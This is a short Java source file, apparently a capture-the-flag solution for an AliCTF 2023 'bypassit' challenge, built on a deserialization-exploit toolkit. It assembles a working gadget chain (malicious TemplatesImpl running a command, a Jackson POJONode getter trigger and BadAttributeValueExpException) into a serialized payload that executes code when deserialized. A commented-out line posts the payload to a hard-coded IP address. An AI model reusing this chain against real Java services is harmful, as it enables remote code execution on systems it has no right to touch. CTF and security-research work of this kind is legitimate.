package dev.silente.javashark.solution;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;

import java.io.FileOutputStream;
import java.util.Base64;

public class AliCTF2023Bypass {

    public static void task1() throws Exception {
        Object templates = STemplates.getEvilTemplates("calc");
        Object json = GPOJONode.toString2Getter(templates);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);
        byte[] code = SerializeUtils.serialize(poc);
//        System.out.println(MiscUtils.base64Encode(code));
        SerializeUtils.deserialize(code);
//        MiscUtils.sendToServer("http://112.124.14.13:8070/bypassit", code);
    }

    public static void main(String[] args) throws Exception {
        task1();
    }
}
